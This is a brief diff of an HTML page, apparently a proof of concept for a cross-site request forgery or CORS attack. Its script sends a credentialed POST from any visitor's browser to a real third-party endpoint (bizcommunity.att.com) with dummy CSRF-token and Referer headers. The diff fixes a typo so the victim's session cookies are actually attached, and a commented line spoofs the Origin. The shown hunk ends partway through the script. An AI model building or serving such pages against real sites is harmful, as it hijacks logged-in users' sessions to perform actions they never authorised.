@@ -1,5 +1,5 @@
 <html>
-    <h1>it works</h1>
+    <h1>it works 123</h1>
     <script>
         let xhr = new XMLHttpRequest();
         xhr.open("POST", "https://bizcommunity.att.com/schema/community");
@@ -8,7 +8,7 @@
         xhr.setRequestHeader("X-Csrf-Token", "no");
         xhr.setRequestHeader("Referer", "no");
         //xhr.setRequestHeader("Origin", "https://example.com/bizcommunity.att.com");
-        hxr.withCredentials = true;
+        xhr.withCredentials = true;
         xhr.onreadystatechange = function () {
           if (xhr.readyState === 4) {
             console.log(xhr.status);
